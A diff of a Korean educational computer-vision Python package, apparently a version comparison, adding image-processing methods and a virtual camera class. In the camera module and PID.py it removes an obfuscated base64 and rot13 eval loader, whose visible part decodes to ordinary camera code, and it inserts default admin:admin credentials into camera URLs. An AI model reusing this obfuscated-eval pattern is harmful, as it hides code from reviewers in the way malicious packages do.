+                rects.append([x, y, x + w, y + h])
+
+        if draw:
+            for bb in rects:
+                (x1, y1, x2, y2) = bb
+                frame = cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 255, 0), 1)
+            self.__frame = frame
+        return rects
+
+    @classmethod
+    def empty(cls, size, color=Color.DEFAULT, width=0, height=0):
+        """지정한 크기의 이미지를 만든다.
+
+        Args:
+            size (tuple): (w, h)
+            weight (int): 이미지의 넓이
+            height (int): 이미지의 높이
+            color (tuple): (r, g, b) 값
+
+        Returns:
+            Image: 만들어진 이미지 객체
+        """
+        if size and isinstance(size, tuple):
+            width, height = size
+        if width == 0 or height == 0:
+            height = builtins.HEIGHT
+            width = builtins.WIDTH
+        frame = np.zeros((height, width, 3), np.uint8)
+        frame[:, :] = color[::-1]
+        return Image(frame)
+
+    @classmethod
+    def fromarray(cls, arr, colorspace=ColorSpace.BGR):
+        if not isinstance(arr, np.ndarray):
+            arr = np.array(arr, dtype="uint8")
+
+        if len(arr.shape) == 2:
+            return Image(arr, ColorSpace.GRAY)
+        else:
+            return Image(arr, colorspace)
+
+    def empty_like(self, color=(255, 255, 255)):
+        """이미지와 같은 차원(shape)의 주어진 색상의 이미지 만든다.
+
+        Args:
+            color (tuple, optional): (r, g, b)값. Defaults to (255, 255, 255).
+
+        Returns:
+            Image: 만들어진 이미지 객체
+        """
+        frame = np.zeros(self.__frame.shape, np.uint8)
+        return Image(frame)
+
+    def background(self, color):
+        """이미지 전체를 주어진 색상으로 바꾼다
+
+        Args:
+            color (tuple): (r, g, b) 색상값
+
+        Returns:
+            Image: 만들어진 이미지 객체
+        """
+        frame = self.__frame.copy()
+        frame[:, :] = color[::-1]
+        return Image(frame)
+
+    def __is_number(self, value):
+        if isinstance(value, int) or isinstance(value, float):
+            return True
+        else:
+            return False
+
+    #
+    # https://docs.python.org/ko/3.7/library/operator.html
+    #
+    def pixel(self, x=0, y=0):
+        """
+        return (r, g, b)
+        """
+        pixel = self.__frame[y, x]
+        pixel = pixel.tolist()
+        if self.__colorSpace == ColorSpace.BGR:
+            pixel = pixel[::-1]  # bgr- > rgb
+        return tuple(pixel)
+
+    # img[:,:,::-1] brg -> rgb,
+    def __getitem__(self, coord):
+        """
+        coord is (x, y)
+        """
+        # coord -> (x, y)
+
+        x, y = coord
+        if isinstance(x, int) and isinstance(y, int):
+            return self.pixel(x, y)
+        elif isinstance(x, slice) and isinstance(y, slice):
+            pixel = self.__frame[y, x]
+            return Image(pixel)
+        else:
+            return None
+
+    def __setitem__(self, coord, value):
+        """
+        coord  is (x, y)
+        value is (r, g, b)
+        """
+        # coord -> (x, y)
+        x, y = coord
+        if self.__colorSpace == ColorSpace.RGB:
+            self.__image[(y, x)] = value
+        else:
+            self.__image[(y, x)] = value[::-1]
+
+    def __bool__(self):
+        if isinstance(self.image, np.ndarray):
+            return True
+        return False
+
+    def __repr__(self):
+        return f"<HelloAI.Image Object Shape:{self.__frame.shape}, Color:({self.__colorSpace}) ,at memory location: ({hex(id(self))})>"
+
+    def __add__(self, other):
+        self_frame = self.__frame
+        other_frame = other.frame
+
+        if self.__is_number(other):
+            other = cv2.add(self.__frame, other)
+        else:
+            # if len(self_frame.shape) == 2:
+            #     self_frame = cv2.cvtColor(self_frame, cv2.COLOR_GRAY2BGR)
+            # if len(other_frame.shape) == 2:
+            #     other_frame = cv2.cvtColor(other_frame, cv2.COLOR_GRAY2BGR)
+            # print('@@@ self.__frame', self_frame.shape)
+            # print('@@@ other.frame', other_frame.shape)
+            if len(self_frame.shape) != len(other_frame.shape):
+                print("두 이미지의 컬러 채널이 다릅니다")
+                return None
+
+            other = cv2.add(self_frame, other_frame)
+        return Image(other, ColorSpace.BGR)
+
+    def diff(self, img):
+
+        frame = self.__frame.copy()
+        other = img.frame.copy()
+        diff = cv2.absdiff(frame, other)
+        gray = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
+        blur = cv2.GaussianBlur(gray, (5, 5), 0)
+        _, thresh = cv2.threshold(blur, 20, 255, cv2.THRESH_BINARY)
+        dilated = cv2.dilate(thresh, None, iterations=3)
+
+        return Image(dilated, ColorSpace.GRAY)
+
+    def __sub__(self, other):
+        if self.__is_number(other):
+            other = cv2.subtract(self.__frame, other)
+        else:
+            # if self.__colorSpace != other.colorspace:
+            #     return None
+            other = cv2.subtract(self.__frame, other.frame)
+        return Image(other)
+
+    def __div__(self, other):
+
+        if self.__is_number(other):
+            other = cv2.divide(self.__frame, other)
+        return Image(other)
+
+    def __truediv__(self, other):
+        if self.__is_number(other):
+            other = cv2.divide(self.__frame, other)
+            other = other.astype(np.uint8)
+        return Image(other)
+
+    def __floordiv__(self, other):
+        if self.__is_number(other):
+            other = cv2.divide(self.__frame, other)
+            other = other.astype(np.uint8)
+        return Image(other)
+
+    def __mul__(self, other):
+        if self.__is_number(other):
+            other = cv2.multiply(self.__frame, other)
+        return Image(other)
+
+    def __neg__(self):
+        """
+        -obj
+        """
+        return self.invert()
+
+    def __invert__(self):
+        """
+        ~obj
+        """
+        return self.invert()
+
+    # 음...제대로 동작하지 않는다..
+    #  BLOB(Binary Large Object)는 이진 스케일로 연결된 픽셀 그룹을 말합니다
+    def __find_blobs(self, min_area=200, draw=False):
+        frame = np.copy(self.__frame)
+        print("__colorSpace ", self.__colorSpace)
+        if self.__colorSpace == ColorSpace.BGR:
+            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
+        elif self.__colorSpace == ColorSpace.RGB:
+            gray = cv2.cvtColor(frame, cv2.COLOR_RGB2GRAY)
+        elif self.__colorSpace == ColorSpace.GRAY:
+            gray = frame
+        else:
+            return
+
+        cv2.imshow("blob", gray)
+
+        # blob 검출 필터 파라미터 생성
+        params = cv2.SimpleBlobDetector_Params()
+
+        # 경계값 조정
+        params.minThreshold = 10
+        params.maxThreshold = 240
+        params.thresholdStep = 5
+        # 면적 필터 켜고 최소 값 지정
+        params.filterByArea = True
+        params.minArea = min_area
+
+        # 컬러, 볼록 비율, 원형비율 필터 옵션 끄기
+        params.filterByColor = False
+        params.filterByConvexity = False
+        params.filterByInertia = False
+        params.filterByCircularity = False
+
+        # 필터 파라미터로 blob 검출기 생성
+        detector = cv2.SimpleBlobDetector_create(params)
+        # 키 포인트 검출
+        keypoints = detector.detect(gray)
+        print("keypoints ", keypoints)
+        # 키 포인트 그리기
+        if draw:
+            frame = cv2.drawKeypoints(
+                frame, keypoints, None, None, cv2.DRAW_MATCHES_FLAGS_DRAW_RICH_KEYPOINTS
+            )
+
+        # 결과 출력
+        return Image(frame, self.__colorSpace), keypoints
+
+    # https://jvvp.tistory.com/1081
+    def erode(self, kernelsize=3, iterations=1):
+        kernel = {}
+        kernel[0] = cv2.getStructuringElement(cv2.MORPH_RECT, (kernelsize, kernelsize))
+        kernel[1] = cv2.getStructuringElement(cv2.MORPH_CROSS, (kernelsize, kernelsize))
+        kernel[2] = cv2.getStructuringElement(
+            cv2.MORPH_ELLIPSE, (kernelsize, kernelsize)
+        )
+
+        if self.__colorSpace != ColorSpace.GRAY:
+            return None
+
+        frame = cv2.erode(frame, kernel[0], iterations=iterations)
+        return Image(frame, ColorSpace.GRAY)
+
+    # https://jvvp.tistory.com/1081
+    def dilate(self, kernelsize=3, iterations=1):
+        kernel = {}
+        kernel[0] = cv2.getStructuringElement(cv2.MORPH_RECT, (kernelsize, kernelsize))
+        kernel[1] = cv2.getStructuringElement(cv2.MORPH_CROSS, (kernelsize, kernelsize))
+        kernel[2] = cv2.getStructuringElement(
+            cv2.MORPH_ELLIPSE, (kernelsize, kernelsize)
+        )
+
+        if self.__colorSpace != ColorSpace.GRAY:
+            return None
+
+        frame = cv2.dilate(frame, kernel[0], iterations=iterations)
+        return Image(frame, ColorSpace.GRAY)
+
+    def color_distance(self, color=(0, 0, 0)):
+        """
+        color is (r, g, b)
+        """
+        frame = self.__frame.copy()
+
+        # color rgb -> bgr
+        color = color[::-1]
+        # frame = frame[:, :, ::-1].transpose([1, 0, 2])
+        distances = spsd.cdist(
+            frame.reshape(-1, 3), [color]
+        )  # calculate the distance each pixel is
+
+        distances *= 255.0 / distances.max()  # normalize to 0 - 255
+        distances = distances.astype(np.uint8)
+        frame = distances.reshape(self.__height, self.__width)
+        return Image(frame, ColorSpace.GRAY)
+
+    def flatten(self):
+        # ret = self.__frame.copy().flatten(order='C')
+        # print(self.__frame.copy().shape, ret.shape)
+        return self.__frame.copy().flatten(order="C")
+
+    # ------------
+    # show 함수를 위해서 window 클래스와 중복된 처리
+    def show(self, title=None):
+        self.__is_notebook = is_notebook() or is_colab()
+        self.__wnd_name = None
+        # print('self.__is_notebook', self.__is_notebook)
+        frame = self.__frame.copy()
+        if self.__is_notebook:
+            # plt.imshow(frame)
+            plt.imshow(np.array(frame))
+        else:
+            if len(builtins.windows) > 5:
+                print("열려있는 창이 너무 많습니다")
+                raise Exception("열려있는 창이 너무 많습니다")
+
+            if not title:
+                self.__wnd_name = str(uuid.uuid4()).split("-")[0]
+            else:
+                self.__wnd_name = title
+
+            cv2.namedWindow(self.__wnd_name)
+            # cv2.imshow(self.__wnd_name, self.__frame)
+            cv2.setMouseCallback(self.__wnd_name, self.mouse_event)
+            if self.__add_window():
+                cv2.imshow(self.__wnd_name, self.__frame)
+
+    def mouse_event(self, event, x, y, flags, params):
+        if builtins.mouse_event:
+            builtins.mouse_event(self.__wnd_name, event, x, y, flags, params)
+
+    def __add_window(self):
+        if self.__wnd_name not in builtins.windows:
+            builtins.windows.append(self.__wnd_name)
+        return True
+
+    def __remove_window(self):
+        if self.__wnd_name not in builtins.windows:
+            builtins.windows.remove(self.__wnd_name)
+
+    def to_pilimage(self):
+        frame = self.__frame.copy()
+        if self.__colorSpace == ColorSpace.BGR:
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        pimg = PImage.fromarray(frame)
+        return pimg
+
+    @property
+    def pilimage(self):
+        return self.to_pilimage()
+
+    @classmethod
+    def from_pilimage(cls, pimg):
+        frame = cv2.cvtColor(np.array(pimg), cv2.COLOR_RGB2BGR)
+        return Image(frame)
+
+    # ////////////////////////////////////////////////////////////////////////////////////////////////////
+    # #  DRAW
+    # def point(self, org=(0, 0), color=(255, 255, 255), thickness=2):
+    #     """
+    #     color = (r,g,b)
+    #     """
+    #     frame = np.copy(self.frame)
+    #     color_bgr = self.__color_rbg_to_bgr(color)
+
+    #     if isinstance(org, list) or isinstance(org, np.ndarray):
+    #         org = tuple(org)
+
+    #     # if float to int
+    #     org = tuple(int(x) for x in org)
+
+    #     frame = cv2.circle(frame, center=org, radius=1, color=color_bgr, thickness=thickness)
+    #     return Image(frame)
+
+    # def point_(self, org=(0, 0), color=(255, 255, 255), thickness=2):
+    #     pass
+
+    # def line(self, start=(0, 0), end=(50, 50), color=(255, 255, 255), thickness=1):
+    #     """
+    #     color = (r,g,b)
+    #     """
+    #     img = np.copy(self.image)
+    #     color_bgr = self.__color_rbg_to_bgr(color)
+    #     if isinstance(start, list) or isinstance(start, np.ndarray):
+    #         start = tuple(start)
+
+    #     if isinstance(end, list) or isinstance(end, np.ndarray):
+    #         end = tuple(end)
+
+    #     # if float to int
+    #     start = tuple(int(x) for x in start)
+    #     end = tuple(int(x) for x in end)
+
+    #     cv2.line(img, start, end, color_bgr, thickness)
+    #     return Image(img)
+
+    # def rectangle(self, start=(10, 10), end=(40, 40), color=(255, 255, 255), thickness=1):
+    #     """
+    #     color = (r,g,b)
+    #     """
+    #     img = np.copy(self.image)
+    #     color_bgr = self.__color_rbg_to_bgr(color)
+
+    #     if isinstance(start, list) or isinstance(start, np.ndarray):
+    #         start = tuple(start)
+
+    #     if isinstance(end, list) or isinstance(end, np.ndarray):
+    #         end = tuple(end)
+    #     # if float to int
+    #     start = tuple(int(x) for x in start)
+    #     end = tuple(int(x) for x in end)
+
+    #     cv2.rectangle(img, start, end, color_bgr, thickness)
+    #     return Image(img)
+
+    # def circle(self, center=(50, 50), radius=5, color=(255, 0, 0), fill=False, thickness=1):
+    #     """원을 그린다
+
+    #     Args:
+    #         center (tuple, optional): 원의 중심 좌료. Defaults to (50, 50).
+    #         radius (int, optional): 원의 반지름. Defaults to 5.
+    #         color (tuple, optional): (r, g, b). Defaults to (255, 0, 0).
+    #         thickness (int, optional): 선의 굵기. Defaults to 1.
+    #                                    -1 일 경우는 원을 채운다
+
+    #     Returns:
+    #         Image: 이미지 객체
+    #     """
+    #     # color = (r,g,b)
+    #     # thickness = -1 원 내부 채우기
+    #     frame = np.copy(self.__frame)
+    #     # color_bgr = self.__color_rbg_to_bgr(color)
+    #     color_bgr = color[::-1]
+
+    #     if isinstance(center, list) or isinstance(center, np.ndarray):
+    #         center = tuple(center)
+
+    #     # if float to int
+    #     center = tuple(int(x) for x in center)
+
+    #     if fill:
+    #         thickness = -1
+
+    #     frame = cv2.circle(frame, center, int(radius), color_bgr, thickness)
+    #     return Image(frame)
+
+    # def polyline(self, points, color=(0, 255, 0), thickness=2, is_closed=True):
+    #     """
+    #     color = (r,g,b)
+    #     """
+    #     color_bgr = self.__color_rbg_to_bgr(color)
+    #     pts = np.array(points, np.int32)
+    #     pts = pts.reshape((-1, 1, 2))
+    #     frame = cv2.polylines(self.__frame, [pts], is_closed, color_bgr, thickness)
+    #     return Image(frame, ColorSpace.BGR)
+
+    # # https://qiita.com/mo256man/items/82da5138eeacc420499d
+    # def text(self, text='', org=(0, 100), size=14, color=(255,255,255)):
+    #     """
+    #     color = (r,g,b)
+    #     """
+    #     # PIL로 저장해서 한글 표시
+    #     x, y = org
+    #     # color_rgb = self.__color_rbg_to_bgr(color)
+    #     # print('color->', color)
+    #     # print('color_rgb->', color_rgb)
+
+    #     pil_img =  self.__frame_to_pil(self.__frame)
+    #     pil_draw = ImageDraw.Draw(pil_img)
+    #     font_ttf = ImageFont.truetype(font = FONT_PATH, size=size) # TrueType（TTF）
+    #     pil_draw.text(xy = (x,y), text = text, fill = color, font = font_ttf)
+    #     frame = self.__pil_to_frame(pil_img)
+    #     return Image(frame, ColorSpace.BGR)
+    # ---------------------------------------------------------------------------------------------
+    # https://pillow.readthedocs.io/en/stable/reference/ImageDraw.html#PIL.ImageDraw.ImageDraw.arc
+    #
+    def point(self, x, y, color=Color.RED):
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__colorSpace)
+        draw = ImageDraw.Draw(pimg)
+        draw.point((x, y), fill=color)
+        frame = self.__pil_to_frame(pimg)
+        return Image(frame, self.__colorSpace)
+
+    def line(self, start, end, color=Color.RED, thickness=1):
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__colorSpace)
+        draw = ImageDraw.Draw(pimg)
+        draw.line([start[0], start[1], end[0], end[1]], fill=color, width=thickness)
+        frame = self.__pil_to_frame(pimg)
+        return Image(frame, self.__colorSpace)
+
+    def line_(self, start, end, color=Color.RED, thickness=1):
+        # 이미지를 직접 업데이트한다.
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__colorSpace)
+        draw = ImageDraw.Draw(pimg)
+        draw.line([start[0], start[1], end[0], end[1]], fill=color, width=thickness)
+        frame = self.__pil_to_frame(pimg)
+        self.__frame = frame
+        return Image(self.__frame, self.__colorSpace)
+
+    def rectangle(self, start, end, outline=(0, 0, 0), fill=None, thickness=1):
+        (x1, y1) = start
+        (x2, y2) = end
+
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__colorSpace)
+        draw = ImageDraw.Draw(pimg, "RGBA")
+        draw.rectangle(
+            ((x1, y1), (x2, y2)), outline=outline, width=thickness, fill=fill
+        )
+
+        frame = self.__pil_to_frame(pimg, self.__colorSpace)
+
+        return Image(frame, self.__colorSpace)
+
+    def rect(self, start, end, outline=(0, 0, 0), fill=None, thickness=1):
+        return self.rectangle(start, end, outline, fill, thickness)
+
+    def ellipse(self, xy, width, height, fill=None, outline=(0, 0, 0), thickness=1):
+        x, y = xy
+        x1 = int(x - (width / 2))
+        y1 = int(y - (height / 2))
+        x2 = int(x + (width / 2))
+        y2 = int(y + (height / 2))
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__colorSpace)
+        draw = ImageDraw.Draw(pimg, "RGBA")
+        draw.ellipse([x1, y1, x2, y2], fill=fill, outline=outline, width=thickness)
+        frame = self.__pil_to_frame(pimg)
+        return Image(frame, self.__colorSpace)
+
+    def arc(self, x, y, width, height, start, end, fill=None, thickness=1):
+        x1 = int(x - (width / 2))
+        y1 = int(y - (height / 2))
+        x2 = int(x + (width / 2))
+        y2 = int(y + (height / 2))
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__get_colorspace)
+        draw = ImageDraw.Draw(pimg)
+        draw.arc([x1, y1, x2, y2], start=start, end=end, fill=fill, width=thickness)
+        frame = self.__pil_to_frame(pimg)
+        return Image(frame, self.__colorSpace)
+
+    def chord(
+        self, x, y, width, height, start, end, fill=None, outline=None, thickness=1
+    ):
+        x1 = int(x - (width / 2))
+        y1 = int(y - (height / 2))
+        x2 = int(x + (width / 2))
+        y2 = int(y + (height / 2))
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__get_colorspace)
+        draw = ImageDraw.Draw(pimg)
+        draw.arc(
+            [x1, y1, x2, y2],
+            start=start,
+            end=end,
+            fill=fill,
+            outline=outline,
+            width=thickness,
+        )
+        frame = self.__pil_to_frame(pimg)
+        return Image(frame, self.__colorSpace)
+
+    # [(x, y), (x, y), ...]
+    def polygon(self, points, fill=None, outline=None):
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__get_colorspace)
+        draw = ImageDraw.Draw(pimg)
+        draw.polygon(points, fill=fill, outline=outline)
+        frame = self.__pil_to_frame(pimg)
+        return Image(frame, self.__colorSpace)
+
+    # https://qiita.com/mo256man/items/82da5138eeacc420499d
+    def text(self, xy, text="HelloAI", size=14, color=(0, 0, 0)):
+        """
+        color = (r,g,b)
+        """
+        # PIL로 저장해서 한글 표시
+        x, y = xy
+        FONT_PATH = "./assets/fonts/gulim.ttc"
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__get_colorspace)
+        draw = ImageDraw.Draw(pimg)
+        font_ttf = ImageFont.truetype(font=FONT_PATH, size=size)  # TrueType（TTF）
+        draw.text(xy=(x, y), text=text, fill=color, font=font_ttf)
+        frame = self.__pil_to_frame(pimg)
+        return Image(frame, self.__colorSpace)
+
+    # -----------------------------------------------------------------------------------------
+
+
+class ImageSet:
+    def __init__(self, path):
+        self.__path = path
+        if not os.path.exists(path):
+            raise Exception("폴더가 존재하지 않습니다. " + path)
+
+        self.__files = glob(os.path.join(path, "*.*"))
+
+    def __iter__(self):
+        return self
+
+    def __next__(self):
+        if len(self.__files) > 0:
+            file_path = self.__files.pop()
+            img = Image.load_image(file_path)
+            return img
+        else:
+            raise StopIteration
+
+    def __len__(self):
+        return len(self.__files)
```

### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

## helloai/core/virtualcamera.py

```diff
@@ -1,8 +1,77 @@
-import base64, codecs
-magic = 'aW1wb3J0IGJ1aWx0aW5zCmltcG9ydCBjdjIgCmltcG9ydCByZXF1ZXN0cyAKaW1wb3J0IG51bXB5IGFzIG5wIAppbXBvcnQgdGltZQpmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgdXJscGFyc2UKCmZyb20gLmltYWdlIGltcG9ydCBJbWFnZSAKCl9fYWxsX18gPSBbJ1ZpcnR1YWxDYW1lcmEnXQoKCmNsYXNzIFZpcnR1YWxDYW1lcmE6CiAgICAiIiIKICAgIGZsaXA6IDEg7KKM7JqwLCAwIOyDge2VmCDrsJjsoIQKICAgICIiIgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHVybCwgZmxpcD1UcnVlKToKICAgICAgICBpZiBub3QgdXJsLnN0YXJ0c3dpdGgoImh0dHA6Ly8iKSBhbmQgbm90IHVybC5zdGFydHN3aXRoKCdodHRwczovLycpOgogICAgICAgICAgICBwcmludCgn7Lm066mU65287J2YIOyjvOyGjOqwgCDsnpjrqrvrkJjsl4jsirXri4jri6QnKQogICAgICAgIAogICAgICAgIHNlbGYuX191cmwgPSB1cmwKICAgICAgICBzZWxmLl9fZmxpcCA9IGZsaXAKICAgICAgICBzZWxmLl9fd2lkdGggPSBidWlsdGlucy5XSURUSAogICAgICAgIHNlbGYuX19oZWlnaHQgPSBidWlsdGlucy5IRUlHSFQKICAgICAgICBzZWxmLl9fY2hhbm5lbCA9IDMKICAgICAgICBzZWxmLl9fdHlwZSA9IE5vbmUKICAgICAgICBzZWxmLl9fY2FwdHVyZSA9IE5vbmUKICAgICAgICBzZWxmLl9fZnJhbWUgPSB'
-love = 'hpP56MKWipltbp2IfMv5sK2uynJqbqPjtp2IfMv5sK3qcMUEbYPOmMJkzYy9sL2uuoz5yoPxcPvNtVPNtVPNtPvNtVPNtVPNtnJLtW3McMTIip3ElMJSgYzAanFptnJ4tp2IfMv5sK3IloQbXVPNtVPNtVPNtVPNtVlOeLJ1cLz90VTScVTAuoJIlLDbtVPNtVPNtVPNtVPOmMJkzYy9sqUyjMFN9VPqunFpXVPNtVPNtVPNtVPNtnJLtW0NaVT5iqPOcovOmMJkzYy9sqKWfBtbtVPNtVPNtVPNtVPNtVPNtpTSlqUZtCFO1pzkjLKWmMFumMJkzYy9sqKWfXDbtVPNtVPNtVPNtVPNtVPNtVlNvnUE0pQbiYmR5Zv4kAwthAwLhZGb5AGV3Y3McMTIip3ElMJSgYzAanFVXVPNtVPNtVPNtVPNtVPNtVPZtpTSlqUZgVSOupaAyHzImqJk0XUAwnTIgMG0anUE0pPpfVT5yqTkiLm0aZGxlYwR2BP42Av4kBwx1ZwpaYPOjLKEbCFpiqzyxMJ9mqUWyLJ0hL2qcWljtpTSlLJ1mCFpaYPOkqJIlrG0aWljtMaWuM21yoaD9WlpcPvNtVPNtVPNtVPNtVPNtVPOmMJkzYy9sqKWfVQ0tMvq7pTSlqUZhp2AbMJ1ysGbiY2SxoJyhBzSxoJyhDUgjLKW0pl5hMKEfo2A9r3OupaEmYaOuqTu9WjbtVPNtVPNtVPNtVPNtVPNtVlO1pzjtCFNvnUE0pQbiY2SxoJyhBzSxoJyhDQR5Zv4kAwthAwLhZGb5AGV3Y3McMTIip3ElMJSgYzAanFVXVPNtVPNtVPNtVPNtVPNtVUAyoTLhK19wLKO0qKWyVQ0tL3LlYyMcMTIiD2SjqUIlMF'
-god = 'hzZWxmLl9fdXJsKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKSAgICMgMXNlYyDsubTrqZTrnbzqsIAg7J247Iud65Cg65WMIOyLnOqwhOydtCDsobDquIgg7ZWE7JqUCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc2VsZi5fX3R5cGUgPSAnYXBwJwogICAgCiAgICBkZWYgcmVhZChzZWxmKToKICAgICAgICBpZiBzZWxmLl9fdHlwZSA9PSAnYWknOgogICAgICAgICAgICByZXR1cm4gc2VsZi5fX3JlYWRfZnJvbV9haWNhbWVyYSgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIHNlbGYuX19yZWFkX2Zyb21fYXBwKCkKCiAgICBkZWYgX19yZWFkX2Zyb21fYWljYW1lcmEoc2VsZik6CiAgICAgICAgcmV0LCBmcmFtZSA9IHNlbGYuX19jYXB0dXJlLnJlYWQoKQogICAgICAgIGlmIHJldDoKICAgICAgICAgICAgc2VsZi5fX2ZyYW1lID0gZnJhbWUKICAgICAgICByZXR1cm4gSW1hZ2UoZnJhbWUpCgogICAgZGVmIF9fcmVhZF9mcm9tX2FwcChzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoc2VsZi5fX3VybCwgc3RyZWFtPVRydWUpIAogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoJ+y5tOuplOudvCDshJzrsoTsl5Ag66y47KCc6rCAIOyeiOyKteuLiOuLpCcpCiAgICAgICAgICAgIHJldHVybiBJbWFnZShzZ'
-destiny = 'JkzYy9sMaWuoJHcPtbtVPNtVPNtVTyzXUVhp3EuqUImK2AiMTHtCG0tZwNjXGbtPvNtVPNtVPNtVPNtVTW5qTImVQ0tLvpaVNbtVPNtVPNtVPNtVPOzo3VtL2u1ozftnJ4tpv5cqTIlK2AioaEyoaDbL2u1ozgsp2y6MG0kZQV0XGbtPvNtVPNtVPNtVPNtVPNtVPOvrKEyplNeCFOwnUIhnlNXVPNtVPNtVPNtVPNtVPNtVTRtCFOvrKEypl5znJ5xXTVaKUuzMyk4MQtaXFNXVPNtVPNtVPNtVPNtVPNtVTVtCFOvrKEypl5znJ5xXTVaKUuzMyk4MQxaXFNXVPNtVPNtVPNtVPNtVPNtVTyzVTRtVG0tYGRtLJ5xVTVtVG0tYGR6VNbtVPNtVPNtVPNtVPNtVPNtVPNtVTcjMlN9VTW5qTImJ2R6LvflKFNXVPNtVPNtVPNtVPNtVPNtVPNtVPOvrKEyplN9VTW5qTImJ2VeZwcqVNbtVPNtVPNtVPNtVPNtVPNtVPNtVTMlLJ1yVQ0tL3LlYzygMTIwo2EyXT5jYzMlo21vqJMzMKVbnaOaYPOxqUyjMG1hpP51nJ50BPxfVTA2Zv5WGIWSDHEsD09ZG1VcVNbtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVUAyoTLhK19zoTyjBtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPOzpzSgMFN9VTA2Zv5zoTyjXTMlLJ1yYPNkXFNtVlNkVBlvwBlnfPjtZPQft4UgyMtt67PL7XPRPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUAyoTLhK19zpzSgMFN9VTMlLJ1yPvNtVPNtVPNtpzI0qKWhVRygLJqyXUAyoTLhK19zpzSgMFxXPt=='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+import builtins
+import cv2 
+import requests 
+import numpy as np 
+import time
+from urllib.parse import urlparse
+
+from .image import Image 
+
+__all__ = ['VirtualCamera']
+
+
+class VirtualCamera:
+    """
+    flip: 1 좌우, 0 상하 반전
+    """
+    def __init__(self, url, flip=True):
+        if not url.startswith("http://") and not url.startswith('https://'):
+            print('카메라의 주소가 잘못되었습니다')
+        
+        self.__url = url
+        self.__flip = flip
+        self.__width = builtins.WIDTH
+        self.__height = builtins.HEIGHT
+        self.__channel = 3
+        self.__type = None
+        self.__capture = None
+        self.__frame = np.zeros((self.__height, self.__width, self.__channel))
+        
+        if 'videostream.cgi' in self.__url:
+            # kamibot ai camera
+            self.__type = 'ai'
+            if '@' not in self.__url:
+                parts = urlparse(self.__url)
+                # "http://192.168.66.1:9527/videostream.cgi"
+                # parts- ParseResult(scheme='http', netloc='192.168.66.1:9527', path='/videostream.cgi', params='', query='', fragment='')
+                self.__url = f'{parts.scheme}://admin:admin@{parts.netloc}{parts.path}'
+                # url = "http://admin:admin@192.168.66.1:9527/videostream.cgi"
+                self.__capture = cv2.VideoCapture(self.__url)
+                time.sleep(1)   # 1sec 카메라가 인식될때 시간이 조금 필요
+        else:
+            self.__type = 'app'
+    
+    def read(self):
+        if self.__type == 'ai':
+            return self.__read_from_aicamera()
+        else:
+            return self.__read_from_app()
+
+    def __read_from_aicamera(self):
+        ret, frame = self.__capture.read()
+        if ret:
+            self.__frame = frame
+        return Image(frame)
+
+    def __read_from_app(self):
+        try:
+            r = requests.get(self.__url, stream=True) 
+        except:
+            print('카메라 서버에 문제가 있습니다')
+            return Image(self.__frame)
+
+        if(r.status_code == 200): 
+            bytes = b'' 
+            for chunk in r.iter_content(chunk_size=1024): 
+                bytes += chunk 
+                a = bytes.find(b'\xff\xd8') 
+                b = bytes.find(b'\xff\xd9') 
+                if a != -1 and b != -1: 
+                    jpg = bytes[a:b+2] 
+                    bytes = bytes[b+2:] 
+                    frame = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_COLOR) 
+                    if self.__flip:
+                        frame = cv2.flip(frame, 1)  # 1 좌우, 0 상하 반전
+                        self.__frame = frame
+        return Image(self.__frame)
+
```

### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

## helloai/ext/__init__.py

```diff
@@ -1,5 +1,5 @@
-# from .hands_detector import *
-# from .pose_detector import *
-# from .face_detector import *
-# from .tmimage import *
+from .hands_detector import *
+from .pose_detector import *
+from .face_detector import *
+from .tmimage import *
 from .aruco import *
```

## helloai/utils/PID.py

```diff
@@ -1,8 +1,77 @@
-import base64, codecs
